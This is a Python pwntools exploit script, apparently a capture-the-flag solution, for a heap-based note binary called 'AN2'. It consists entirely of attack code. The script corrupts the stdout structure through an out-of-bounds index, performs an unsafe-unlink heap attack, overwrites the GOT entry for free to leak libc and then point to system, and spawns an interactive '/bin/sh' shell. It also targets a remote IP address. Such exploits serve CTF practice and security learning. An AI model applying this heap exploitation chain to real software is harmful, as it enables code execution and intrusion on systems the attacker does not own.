#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./AN2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 20701)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./AN2', checksec=False)


def add(add_size, add_content):
    p.sendlineafter('4.edit\n:', '1')
    p.sendlineafter('size?\n', str(add_size))
    p.sendline(add_content)


def delete(delete_idx):
    p.sendlineafter('4.edit\n:', '2')
    p.sendlineafter('index?\n', str(delete_idx))


def edit(edit_idx, edit_content):
    p.sendlineafter('4.edit\n:', '4')
    p.sendlineafter('index?\n', str(edit_idx))
    p.sendline(edit_content)


got_free = elf.got['free']
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
addr_stdout = 0x6020A0
addr_chunk_list = 0x6020E0

p.recvuntil("Welcome to Annevi's note2\n")
p.sendline('4')
sleep(0.3)
p.sendline(str((addr_stdout - addr_chunk_list) / 8))
sleep(0.3)
p.sendline(p64(0xfbad28a7) + p64(0) * 13 + p32(2))
sleep(0.3)

add(0x90, '')
add(0x90, '')
add(0x90, '/bin/sh 1>&2')
add(0x90, '')
add(0x90, '')
pd = p64(0) + p64(0x91)
pd += p64(addr_chunk_list) + p64(addr_chunk_list + 8)
pd += '\x00' * 0x70
pd += p64(0x90) + p64(0xa0)
edit(3, pd)
delete(4)

pd = p64(got_free)
pd += p64(got_puts)
edit(3, pd)
edit(0, p64(plt_puts))
delete(1)

addr_puts = u64(p.recv(6).ljust(8, '\x00'))
libcbase = addr_puts - libc.sym['puts']
addr_system = libcbase + libc.sym['system']

edit(0, p64(addr_system))
delete(2)
success('addr_puts   = ' + hex(addr_puts))
success('addr_system = ' + hex(addr_system))
p.interactive()
